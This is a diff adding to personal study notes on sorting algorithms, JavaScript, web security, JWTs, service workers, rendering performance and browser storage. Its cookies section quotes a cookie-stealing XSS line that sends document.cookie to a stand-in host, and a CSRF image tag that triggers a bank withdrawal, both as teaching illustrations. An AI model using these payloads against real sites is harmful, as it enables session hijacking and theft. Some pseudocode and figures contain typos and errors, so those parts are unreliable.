@@ -77,21 +77,133 @@ Understanding big O notation
 
 Sorting
 - QuickSort
+  divide and conquer algorithm, picks an element as a pivot and partitions the given array around the picked pivot
+  i.e. variations like always pick first element as pivot, always pick last element as pivot, pick random element as pivot, pick median as pivot
+  key process is partition(): should place an element x as pivot in its correct position in a sorted array
+    and put all smaller elements than x before x and all greater elements than x after x which should be done in linear time
+-> preferred because it is an in-place sort and doesn't require any extra storage
+-> practical versions use randomized version to avoid worst case for sorted array
+-> cache friendly with good locality of reference when used for arrays, tail recursive and tail call optimizations can be done
+-> prefer this over merge sort when dealing with arrays
 -> General Algorithm
+// start from leftmost element and keep track of index of smaller/equal elements as i; while traversing if we find a smaller element, we swap
+// current element with arr[i]; otherwise we ignore current element
+quicksort(arr, low, high)
+  if (low < high) {
+    // pi is partitioning index, arr[pi] is now at right place
+    pi = partition(arr, low, high);
+
+    quickSort(arr, low, pi-1);    // before pi
+    quickSort(arr,, pi + 1, high) // after pi
+  }
+
+// takes last element as pivot, places pivot element at correct position in sorted array and places all smaller than pivot to left
+// and all greater elements to right of pivot
+partition(arr, low, high) {
+  // pivot (element to be placed at right position)
+  pivot = arr[high];
+  
+  // Index of smaller element
+  i = (low - 1)
+
+  for (j = low; j <= high - 1; j++) {
+    // If current element is smaller than or equal to pivot
+    if (arr[j] <= pivot) {
+      i++; // increment index of smaller element
+      swap arr[i] and arr[j]
+    }
+  }
+  swap arr[i+1] and arr[high]
+  return i+1
+}
 -> Stable: no
 -> Time Complexity:
-  Best Case: O(Nlog(N))
-  Worst Case: O(N^2)
-  Average Case: O(Nlog(N))
+  Best Case: O(Nlog(N)) - when always picking the middle elemnt as pivot
+  Worst Case: O(N^2) - when always picking greatest or smallest element as pivot like when array is already sorted
+  Average Case: O(Nlog(N)) - its inner loop can be efficiently implemented in most architectures, can change choice of pivot so worst case rarely occurs
+  Space Complexity: O(1)
+
+- Similar QuickSelect: selection algorithm to find kth smallest/max element in unordered list
+-> General algorithm
+  - instead of recurring for both sides after finding the pivot, it recurs only for the part that contains
+  the k-th element
+  i.e. for kth smallest element, if index of partitioned elelement is more than k, we recur for left part
+  if index is same as k, we found the kth smallest element
+  if index is less than k, we recur for the right part
+
+function quickSelect(list, left, right, k) 
+  if left = right
+    return list[left]
+  
+  select a pivotIndex between left and right
+
+  pivotIndex = partition(list, left, right, pivotIndex)
+
+  if k = pivotIndex
+    return list[k]
+  else if pivotIndex > k
+    // go left
+    right = pivotIndex - 1
+  else
+    // go right
+    left = pivotIndex = 1
+-> Time Complexity: reduced expected complexity from O(NlogN) to O(N) with worst case of O(N^2)
 
 MergeSort
 -> divide and conquer algorithm, continuously divides array in to two halves, recurses on
 both the left subarray and right subarray and then merges the two sorted halves
+-> generally considered better when data is huge and stored in external storage, needs O(N) extra storage though
+-> has to deal with allocating and de-allocating extra space of merged array results
+-> merge sort preferred for linked lists as nodes are not adjacent in memory, can insert items in middle in O(1) extra space and O(1) time
+-> merge operations can be implemented without extra space for linked lists, must travel from head to ith node to reach something and overhead of partitioning
+increases for quicksort
+-> merge sort accesses data sequentially and need of random access is low
 -> General Algorithm
+  divides input array in two halves, calls itself for the two halves and then merges the two sorted halves
+  merge() to merge two halves - merge(arr, l, m, r), assumes arr[l...m] and arr[m+1...r] are two sortred sub-arrays
+
+// Keeps dividing array in half until size becomes 1 and then starts merging arrays back
+MergeSort(arr, left, right) 
+  if right > left
+    1. Find middle point to divide array into two halves
+      mid = (left + right) / 2
+    2. Call mergeSort for first half
+      call mergeSort(arr, left, mid)
+    3. Call merge sort for second half
+      call mergeSort(arr, mid+1, right)
+    4. Merge the two halves sorted in step 2 and 3
+      call merge(arr, left, mid, right)
+
+merge(arr, left, mid, right)
+  n1 = mid - left + 1
+  n2 = right - mid
+  create l[n1] and r[n2]
+
+  copy data into left and right arrays
+  l[i] = arr[left + i]
+  r[j] = arr[mid + 1 + j]
+
+  i = 0;
+  j = 0;
+  k = left
+  while i < n1 and j < n2
+    if (l[i] <= r[j])
+      arr[k] = l[i]
+      i++
+    else
+      arr[k] = r[j]
+      j++
+    k++
+
+  // Copy remaining elements of l[] if there are any
+  // Copy remaining elements of r[] if there are any
+
 -> Stable: yes
+  Time Complexity:  
   Best Case: O(Nlog(N))
   Worst Case: O(Nlog(N))
   Average Case: O(Nlog(N))
+  Space Complexity: O(N)
 
 BucketSort
 -> distributes elements of an array in to a number of buckets, each buck is then sortred individually either using
@@ -471,8 +583,20 @@ function isInteger(x) { return Math.round(x) === x; }
 by using higher-level functional abstractions i.e. forEach() loop
 vs. imperative: transparency forced by lower-level command/instruction statements i.e. for loop
 
--> Shim
-   Polyfill
+-> Shim: any piece of code that performs interception of an API call and provides a layer of abstraction
+   Polyfill: type of shim that retrofits legacy browsers with modern HTML5/CSS3 features usually using JavaScript
+
+-> Event Propagation
+when an event occurs in an element inside another element and both elements have registered a handle for that event, event propagation mode determines
+in which order elements receive event
+bubbling: event is first captured and handled by innermost element and then propagated to outer elements
+capturing: event is first captured by outermost element and propagated to inner elements
+  elem.addEventListener(type, handler, true) -> rarely used, some events don't bubble like onfocus/onblur but can be captured
+
+-> JavaScript sort() function => different browsers feature different sort algorithms
+depending on type of array, different sort methods used
+Webkit implements some variation of quicksort called intro sort for numeric arrays;
+for non-numeric arrays it uses mergesort
 
 -> what is "this"?
 at time of execution of every function, JS engine sets property to function called "this" which refers to the current
@@ -496,6 +620,18 @@ doesn't do the basics of validating or escaping input;
 -> can send inputs via request parameters or client side input fields (cookies, form fields, url params)
 -> can be written back to screen, persisted in database or executed remotely
 -> to run untrusted code upon rendering
+- allows attacker to inject into a website malicious client-side code; one can bypass controls and impersonate users
+- usually occur when data enters a web app through an untrusted source (most often a web request) or dynamic content sent to web user
+without being validated for malicious content
+- commonly include transmitting private data like cookies or session information, redirecting victim to webpage controlled by attacker or
+performing malicious operations on user's machine under guise of vulnerable site
+- three categories: stored (persistent), reflected (non-persistent), DOM-based
+-> stored XSS attacks - injected script is stored permanently on target servers; victim then retrieves malicious scripts from server when browser sends a request for data
+-> reflexted XSS attacks - user tricked into clicking malicious link, submitting a form or browsing to malicious site, injected code travels to vulnerable website. web server 
+reflects injected script back to user's browser as an error/search result/server response. brwoser executes code because it assumes response is from
+a "trusted" server which user has already interacted with
+-> DOM-based XSS attacks - payload is executed as a result of modifying DOM environment in victim's browser used by original client-side script; page does not change but client side
+code contained in page runs in an unexpected manner because of malicious modifications to DOM environment
 
 - XSRF (Cross-site Request Forgery): happens in authenticated sessions when server trusts user/browser
 -> can place a malicious link embedded in another link or a zero byte image with bad src;
@@ -505,8 +641,69 @@ because your session is still active in browser and browser has session id
 and additional validation at server for the CSRF token to be sure attacker manipulated link doesn't work
 -> to hijack authentication, causes web app to process an attacker-specified request within context of victim's authenticated session
 -> i.e. loading img with bad src and passes along authentication with the request 
+- attack that impersonates trusted user and sends a website unwanted commands like including malicious parameters in URL behind a link that purports to go 
+somewhere else
+-> check standard headers to verify request is same origin
+-> check CSRF token i.e. custom headers X-Requested-With: XMLHttpRequest, encyrpted token pattern, double cookie defense
 
-- Using JWT
+- Using JWT (JSON Web Tokens)
+-> open, industry standard RFC 7519 method for representing claims securely between two parties
+-> compact and self-contained way for securely transmitting info between parties as JSON object which can be verified and trusted because it is digitally signed
+-> can be signed using secret with HMAC algorithm or public/private key pair using RSA
+-> can be encrypted to hide claims from parties
+-> can be signed tokens to verify integrity of claims contained within it; public/private key paris signature certifies tha tonly party holding private key is one that signed it
+-> compact: send through URL, POST parameter, HTTP header => faster transmission
+-> self-contained: payload contains all required information about user, avoiding need to query database more than once
+-> used for authentication i.e. once user is logged in, each subsequent request will include JWT, allowing user to access routes, services, and resources that are permitted with
+that token; Single Sign On with small overhead and used across different domains
+-> used for information exchange: can be sure senders are who they say they are, signature calculated using header and payload to verify content hasn't been tampered with
+-> structure: header, payload, signature (xxxxx.yyyyy.zzzzz)
+-> header: type of token = JWT and hashing algorithm used like HMAC SHA256 or RSA
+{ // Base64Url encoded
+  "alg": "HS256",
+  "typ": "JWT"
+}
+-> payload: contains claims (statements about entity like user and additional metadata)
+  can be registered, public, and private claims
+{
+  "sub": "1234567890",
+  "name": "John Doe",
+  "admin": true
+}
+-> signature: takes encoded header and encoded payload, a secret, algorithm specified in header, and signs it
+HMACSHA256(
+  base64UrlEncode(header) + "." +
+  base64UrlEncode(payload),
+  secret)
+-> output is three Base64-URL strings separated by dots that can be easily passed in HTML and HTTP environment while being more compact when compared to XML-based standards such as SAML
+-> authentication case: when user successfully logs in using credentials, JWT returned and must be saved locally (typically in localStorage but cookies can be used) rather than creating session
+in server and returning a cookie
+  whenever user wants to access protected route or resource, user agent should send JWT, typically in Authorization header using Bearer schema
+  i.e. Authorization: Bearer <token> => stateless auth mechanism as user state is never saved in server memory
+  and server's protected routes will check for valid JWT in Authorization header and if it's present, user will be allowed access to protected resources
+  -> can now rely on data APIs that are stateless, doesn't matter which domain serving your APIs so CORS won't be an issue as it doesn't use cookies
+  -> should not put secret information within token as all information is exposed to users or other parties though they can't change it
+  i.e. Sample Flow
+  1. POST /users/login with username and password
+  2. Create a JWT with a secret
+  3. Returns JWT to browser
+  4. Sends JWT on Authorization Header
+  5. Check JWT signature. Get user information from JWT
+  6. Sends reponse to client
+-> Why use this? JSON less verbose than XML, can be signed RSA style, JSON parsers mapping directly to objects easily rather than SAML,
+used at Internet scale on multiple platforms especially mobile
+-> can store token on localStorage (data persists until explicitly deleted, changes saved and available for all current and future visits to the site)
+  on sessionStorage(changes made are saved and available on current page as well as future visits to site on same window but once window is closed, storage is deleted)
+  disadvantages of Web Storage:
+    sandboxed to specific domain and its data cannot be accessed by any other domain including sub-domains
+    accessible through JS on same domain so any JS running on site will have access to web storage and can be vulnerable to XSS
+    must ensure JWT is always sent over HTTPS and never HTTP
+  on cookies: can control its lifetime say after browser is closed (session cookie), server side check and implement expiration, can be persistent (not destroyed after browser is closed with expiration)
+    can be read by both JS and server side code or only server side if HttpOnly flag is set
+  disadvantages of cookie:
+    max size of cookie is only 4kb, so it's tough if you have many claims
+    vulnerable to CSRF but one can check HTTP Referer and Origin header
+    difficult to implement for cross-domain access, have additional properties (Domain/Path) that can be modified to allow you to specify where cookie is allowed to be sent
 
 HTTP Headers:
 - allow the client and server to pass additional information with the request or the response
@@ -599,14 +796,137 @@ Webpack require function, wrapped modules go to an array at end of our bundle
 -> need to use ModuleConcatenationPlugin
 - don't ship dev code to prod
 
-- Progressive Web Apps (using service workers to cache assets and have an offline experience)
+- Progressive Web Apps (using service workers to cache assets and have an offline experience and IndexedDB for transactions/data store)
+-> Service Workers
+  act as proxy servers that sit between web applications, browser, and network when available; intercept requests, update assets on server, create offline experience,
+  allow access to push notification and background sync APIs
+
+  event-driven worker registered against origin and path, takes form of JS file that can control webpage associtaed with it, intercepting and modifying navigation and resource requests
+  and caching resources
+
+  run in a worker context: no DOM access, runs on different thread to main JS so it is not blocking, designed to be fully async
+  (can't use synchronous XHR or localStorage here)
+
+  run over HTTPs only to prevent man in middle attacks, makes heavy use of promises
+
+  first registered using ServiceWorkerContainer.register() method to download service worker to client and attempt to install/activate for URLs accessed by user inside
+  whole origin or subset specified by you
+
+  lifecycle of download every 24 hours, install based on newly downloaded files, activate when no other pages loaded still using old service worker
+  but one can use ServiceWorkerGlobalScope.skipWaiting() and existing pages can be claimed by active worker using Clients.claim()
+
+  can listen for InstallEvent to prepare service worker for usage when this fires like creating cache using built in storage API and placing assets inside it you'll
+  want for running app offline; activate event for you to clean up old caches and other things from previous version of service worker
+
+  can response to requests using the FetchEvent event and cna modify response to these requests in any way you want using FetchEvent.respondWith method
+
+  use cases: background data sync, responding to resource requests from other origins, centralized updates to expensive-to-calculate data like geolocation or gyroscope
+  so multipe pages can make use of one set of data, client-side compiling and dependency management, hooks for background services, custom templating based on certain URL patterns,
+  performance enhancements for pre-fetching resources user is likely to need in near future
+
+  app shell model: minimal HTML, CSS, and JS required to power user interface and when cached offline can ensure instant, reliably good performance to users on repeat visits;
+  shell not loaded from network every time user visits; aggressively caching shell using service worker, dynamic content loads for each page using JS, get initial HTML onto screen
+  should load fast, use little data as possible, use static assets from local cache, separate content from navigation, retrieve and display page-specific content, optionally cache dynamic content
 
 - Using a Content Delivery Network to cache assets at edge locations in different regions i.e. AWS CloudFront
 
+- Notes:
+  high performing sites engage and retain users better (Google Score Card and Impact Calculator), better user experience
+  audit what resources you send to users: do you really need Bootstrap or Foundation to build UI? can just use CSS Flexbox and Grid
+  -> CSS is render blocking resource and overhead of CSS framework can delay rendering significantly
+  -> JS libraries convenient but not always necessary like jQuery i.e. querySelector, querySelectorAll; event binding with addEventListener, classList, setAttribute, getAttribute
+  using Preact rather than React, Zepto rather than jQuery
+  -> not all websites need to be SPAs as they make extensive use of JS (most expensive resource we serve on web byte for byte) - needs to be downloaded, parsed, compiled, executed
+    can possibly do HTTP caching and use service worker
+  -> can fix how you send resources like migrating to HTTP/2 to address concurrent request limits and lack of header compression, expedite delivery of resources using resource hints
+  like rel=preload to allow early fetches of critical resources before browser would discover them to lower time to interactive, rel=preconnect for resources on third party domains
+  -> HTTP/1 led to bundling styles and scripts but HTTP/2 may have cheaper multiple simultaneous requests; code splitting in webpack to limit amount of scripts downloaded to only what is
+  needed by current page or view, separate CSS intos maller template or component-specific files
+  -> mind how much data you spend: minify text assets (removing unnecessary whitespace, comments, other content), uglification in JS (shortening variable and method names),
+  configure server to compress resources (GZIP, Brotli compression), optimize images/serving alternative formats like WebP for smaller file size, send images responsively (proper size for certain screen widths)
+  by adding srcset attribute to <img> element to specify array of images the browser can choose from or <picture> to choose optimal image format for browser, client hints for network/device characteristics
+
+  - RAIL: response, animation, idle, load (300ms to 1000ms)
+  -> respond in under 50m, animate and produce a frame in 10ms or less, maximize idle time, load: deliver content and become interactive in under 5 seconds
+  -> measure through Chrome DevTools - throttle CPU/network, view main thread activities, analyze FPS, view network requests, view paint events and scroll performance issues in real-time, Lighthouse, WebPageTest
+
+  Rendering Performance:
+  -> most devices had 60fps, all work needs to be completed inside 10ms; otherwise frame rate drops and content judders on screen = jank
+  -> pixel pipeline:
+    1. JS: to handle work resulting in visual changes like animate function in jQuery, adding DOM elements to page dynamically though there are CSS animations too
+    2. Style calculations: figuring out which CSS rules apply to which elements based on matching selectors
+    3. Layout: calculates how much space each element takes up and where it is on screen and one element can affect otherwise
+    4. Paint: process of filling in pixels and drawing out text, colors, images, borders and shadows, done onto multiple surfaces called layers
+      - creating a list of draw calls and "rasterization" = filling in pixels
+    5. Compositing: multiple layers need to be drawn onto screen in correct order so page renders correctly i.e. overlapping elements
+
+    three ways pipeline normally plays out
+    1. JS/CSS > Style > Layout > Paint > Composite
+      if you change a layout property like changing an element's geometry like width, height, position with left or top, browser will have to check
+      all other elements and "reflow" the page and any affected areas will need to be repainted and final painted elements will need to be composited back together
+    2. JS/CSS > Style > Paint > composited
+      if you change a "paint only" property like a background image, text color, shadows that do not affect layout of page, then browser skips layout but will do paint
+    3. JS/CSS > Style > Composite
+      if you change a property that requires neither layout nor paint and browser jumps to compositing = cheapest and most desirable for high pressure points in app's lifecyle like
+      animations or scrolling
+
+    optimizing JS execution
+      -> avoid setTimeout or setInterval for visual updates; use requestAnimationFrame instead; move long-running JS off main thread to web workers
+      -> use micro-tasks to make DOM changes over several frames
+      -> use Chrome DevTools' Timeline and JS Profiler to assess impact of JS
+
+    reduce scope and complexity of style calculations
+      -> adding and removing DOM elements, changing attributes, classes or through animation will cause browser to recalculate element styles
+      and in many cases layout or reflow the page or parts of it = computed style calculations
+      1. creating a set of matching selectors (browser figuring out which classes, pseudo-selectors and IDs apply to any given element)
+      2. taking all style rules from matching selectors and figuring out what final styles element has
+      -> reduce complexity of selectors through use of class-centric methodology like Bellman
+      -> reduce number of elements on which style calculation must be calculated
+        worst case is number of element multiplied by selector count because each element needs to be at least checked once against every style to see if it matches
+      
+      avoid large, complex layouts and layout thrashing
+      -> concerns about number of elements that require layout, complexity of layouts
+      -> layout normally scoped to whole document, number of DOM elements will affect performance so you should avoid triggering layout wherever possible
+      -> assess layout model performance i.e. Flexbox is faster than older Flexbox or float-based layout models or position elements
+      -> avoid forced synchronous layouts and layout thrashing; read style values then make style changes
+
+      simplify paint complexity and reduce paint areas
+      -> changing any property apart from transforms or opacity always triggers paint
+        triggering layout always triggers paint; others like background/textcolor/shadows
+      -> paint is often the most expensive part of pixel pipeline so avoid it where you can
+      -> reduce paint areas through layer promotion and orchestration of animations
+        browsers union together two areas that need painting and can result in entire screen being repainted i.e. fixed header and rest of body
+        orchestrate animations and transitions to not overlap as much
+      -> use DevTools paint profiler to assess paint complexity and cost, reduce where you can
+
+      stick to compositor-only properties and manage layer count
+      -> stick to transform and opacity changes for animations
+      -> promote moving elements with will-change or translateZ
+      -> avoid overusing promotion rules; layers require memory and management
+
+      debounce input handlers
+      -> avoid long-running input handlers as they can block scrolling
+      -> don't make style changes in input handlers
+      -> debounce handlers; store event values and deal with style changes in the next requestAnimationFrame callback
+        editing and then reading styles can result in layout thrashing (read first then edit styles)
+
+
 Local Storage:
-
--
-
+- read-only window.localStorage property allows you to access Storage object for Document's origin
+- stored data is saved across browser sessions, has no expiration time
+- around 5MB, only string data (though you can serialize everything), synchronous, can't be used by web workers
+- any JS code on page can access local storage and no data protection
+- can store public, insensitive information, for string data/not larger than 5MB and not used in high-performance app
+- beware of XSS if you store session/user sensitive information; attacker running JS on your website and sending local storage information
+to their own domain
+-> if website contains any third party JS code from source outside domain i.e. bootstrap, jQuery, React, ad network, Google Analytics, tracking code,
+you are at risk for other JS running on you website if say any of those sources are compromised
+-> don't store JSON Web Tokens (session data) in local storage as sattackers can make requests to website on your behalf
+-> to store sensitive data (user IDs, session IDs, JWTs, personal/credit card information, API keys), always use a server-side session
+-> when logging into website, create session identifier and store it in cryptographically signed cookie
+-> make sure web framework for cookies is setting httpOnly flag as it makes it impossible for a browser to read any cookies and also set SameSite=strict cookie flag
+to prevent CSRF attacks as well as secure=true flag to ensure cookies can only be set over an encrypted connection
+-> each time user makes a request to your site, use session ID extracted from cookie sent to you to retrieve accounts details from db or cache
 - Caveats with Private Browsing Mode:
   Safari returns null for any item set using localStorage.setItem either before or during the private browsing session. 
   In essence, neither sessionStorage or localStorage are available in private brosing mode
@@ -617,9 +937,62 @@ Local Storage:
   Firefox, like Chrome will not retrieve items set on locaStorage prior to a private session starting, but in private browsing treats localStorage like sessionStoroage for non private windows and tabs, but like localStorage for other private windows and tabs
 
 Session Storage:
+- window.sessionStorage, data stored in sessionStorage gets cleared when page session ends or when page is closed, specific to protocol of the page
 
 
 Cookies:
+- HTTP cookie (web cookie/browser cookie) is a small piece of data that a server sends to the user's web browser
+and browser may store it and send it back with next request to same server
+-> typically used to tell if two requests came from the same browser to keep a user logged in; remembers stateful information for stateless HTTP protocol
+- mainly used for session management (logins, shopping carts, game scores, anything server should remember)
+-> personalization (user preferences, themes, other settings)
+-> tracking (recording and analyzing user behavior)
+- used to be used for general client-side storage until sessionStorage, localStorage, indexedDB came out
+- since cookies are sent with every request, they can worsen performance (especially for mobile data connections)
+- when receiving HTTP request, server can send a "Set-Cookie" header with response and this cookie stored by browser and then cookie is sent with requests made
+to the same server inside a "Cookie" HTTP header
+-> expiration date or duration can be specified and after which cookie is no longer set; can also set restrictions to a specific domain and path
+i.e. header from server tells client to store a cookie
+Set-Cookie: <cookie-name>=<cookie-value>
+
+HTTP/1.0 200 OK
+Content-type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+
+// session cookie set
+GET /sample_page.html HTTP/1.1
+Host: www.example.org
+Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+- session cookies: deleted when client shuts down because it didn't specify Expires or Max-Age directive though browsers may use session restoring
+which makes most session cookies permanent as if browser was never closed
+- permanent cookies: expire at a specific date (Expires) or after a specific length of time (Max-Age)
+i.e. Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
+- secure cookie is only sent to server with an encrypted request over the HTTPS protocol
+-> even with Secure, sensitive information should never be stored in cookies as they are Insecure
+-> to prevent cross-site scripting (XSS) attacks, HttpOnly cookies are inaccessible to JS's Document.cookie API and are only sent to server
+i.e. cookies that persist server-side sessions don't need to be available to JS and HttpOnly Flag should be set
+Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+- Domain and Path directives define the scope of the cookie: what URLs the cookies should be sent to
+-> Domain: specifies allowed hosts to receive the cookie (subdomains included), defaults to host of current document location
+-> Path: indicates URL path that must exist in requested URL in order to send the Cookie header i.e. /docs
+- SameSite cookies let servers require that a cookie shouldn't be sent with cross-site requests which somewhat prevents against cross-site request forgery attacks
+-> not yet supported by all browsers
+- new cookies can be created via Document.cookie property and if HttpOnly flag is not set, existing cookies can be accessed from JS as well
+-> cookies available to JS can get stolen through XSS
+- confidential/sensitive information should never be stored or transmitted in HTTP Cookies as mechanism is insecure
+-> cookies often used in web app to identify a user and authenticated session, so stealing a cookie can lead to hijacking the authenticated user's session
+i.e. social engineering or exploiting XSS vulnerability but HttpOnly cookie can help mitigate this attack by preventing access to cookie value through JS
+(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+-> CSRF: say image isn't really an image but a request to steal your information/money
+<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
+-> if logged into account and cookies still valid, will transfer money as soon as you load HTML that contains img
+-> can prevent this through input filtering, should always be confirmation required for any sensitive action, cookies for sensitive actions should have a short lifetime only
+-> can also verify Same Origin and check CSRF tokens
+- cookies have domain associated to them; if same domain as the page you're on, cookies are a first-party cookie and sent only to server setting them; if different, third-party cookie
+and third-party cookies for tracking and advertising in third-party components (some add-ons can block them)
+-> can set clear disclosures/privacy policies to notify users of cookies
+-> Do-Not-Track, zombie/"Evercookies" recreated after deletion and are intentionally hard to delete forever
 
 REST API:
 REST stands for Representational State Transfer, an architectural style that has largely been adopted as a best practice for building web and mobile applications. 
